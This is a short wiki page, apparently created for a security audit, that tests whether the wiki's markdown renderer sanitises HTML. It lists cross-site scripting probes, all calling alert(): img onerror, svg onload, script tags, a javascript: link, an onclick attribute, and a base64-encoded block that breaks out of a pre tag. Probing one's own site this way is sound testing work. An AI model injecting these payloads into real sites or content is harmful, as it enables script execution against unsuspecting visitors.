---
title: XSS probe
description: sec-audit probe
published: true
date: 2026-10-19T02:17:11.664Z
tags: sec-audit
editor: markdown
dateCreated: 2026-10-19T02:17:11.664Z
---

# XSS probe

inline bold <b>BOLD</b>

img <img src=x onerror=alert(1)>

svg <svg/onload=alert(2)>

script <script>alert(3)</script>

jslink [click](javascript:alert(4))

attr <a href="#" onclick="alert(6)">onclick</a>

```diagram
PC9wcmU+PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDUpPg==
```

```html
<img src=x onerror=alert(7)>
```
